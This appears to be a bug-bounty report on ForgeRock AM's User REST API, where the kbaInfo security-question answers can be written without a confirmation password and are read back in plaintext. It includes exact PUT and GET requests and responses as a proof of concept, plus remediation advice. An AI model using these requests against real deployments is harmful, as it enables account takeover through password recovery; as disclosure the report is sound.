# Missing confirmation-password protection on kbaInfo (KBA security questions) in ForgeRock AM User REST API

## Summary

The ForgeRock AM JSON User REST API (`PUT /am/json/realms/root/realms/alpha/users/{id}`) requires a "confirmation password" when an authenticated user modifies **protected attributes** such as `mail`:

```
HTTP/1.1 400 Bad Request
{"code":400,"reason":"Bad Request","message":"Must provide a valid confirmation password to change protected attribute (mail) from '1643584176@qq.com' to ''"}
```

However, the **`kbaInfo`** attribute (Knowledge-Based Authentication security-question answers, which the same environment collects as mandatory data during self-registration via `KbaCreateCallback`) is **not** in the protected-attribute list: it can be written with a plain `PUT` without any confirmation password, and the answers are then returned in **plaintext** via `GET ?_fields=kbaInfo`.

## Steps to Reproduce

Authenticated as the regular self-service user `pccp` (session cookie + `Accept-API-Version: resource=2.1, protocol=1.0`).

**1. Baseline – protected attribute `mail` requires confirmation password:**

```
PUT /am/json/realms/root/realms/alpha/users/db3d6356-61a0-4684-9eaa-c1353dfa44d9
{"mail": ["pccp_probe@example.com"]}

HTTP 400
{"code":400,"reason":"Bad Request","message":"Must provide a valid confirmation password to change protected attribute (mail) from '1643584176@qq.com' to ''"}
```

**2. `kbaInfo` (KBA answers) is writable without any confirmation:**

```
PUT /am/json/realms/root/realms/alpha/users/db3d6356-61a0-4684-9eaa-c1353dfa44d9
{"kbaInfo": [{"questionId": "1", "answer": "kba_poc_answer_2026"}]}

HTTP 200
{"realm":"/alpha","username":"pccp",...,"kbaInfo":[{"questionId":"1","answer":"kba_poc_answer_2026"}]}
```

**3. Answers are readable in plaintext:**

```
GET /am/json/realms/root/realms/alpha/users/db3d6356-61a0-4684-9eaa-c1353dfa44d9?_fields=kbaInfo

HTTP 200
{"kbaInfo":[{"questionId":"1","answer":"kba_poc_answer_2026"}]}
```

No `Origin` header, CSRF token, or extra field is required for step 2. The test user's `kbaInfo` was reset afterwards (`PUT {"kbaInfo": []}`).

## Impact

- The protected-attribute mechanism is bypassed for KBA answers. KBA (security questions) is a credential-recovery factor: in this environment the registration tree (`Registration`) mandates `KbaCreateCallback`, i.e. the product collects and relies on KBA as a recovery credential.
- An attacker holding a victim's (or shared) session – e.g. after XSS, session fixation, or shared-device use – can silently set their own KBA answers; should the KBA-based password-recovery flow (`forgotPassword`) be enabled (it is currently disabled on this staging instance, HTTP 503), this directly enables full account takeover via "forgot password".
- The plaintext read-back of answers is also inconsistent with the intent of a secret recovery factor.
- No cross-user access is involved; the issue is the missing protection on a sensitive self-service attribute.

## Remediation

- Add `kbaInfo` to the realm's protected attributes (same confirmation-password requirement as `mail`).
- Consider storing/handling KBA answers as one-way hashes and never returning them in API responses.

## Notes

- Scope: Ping Identity AIC staging (openam-bug-bounty-stag.forgeblocks.com), regular user scope only.
- Reproduced on 4 independent authenticated sessions (identical results).
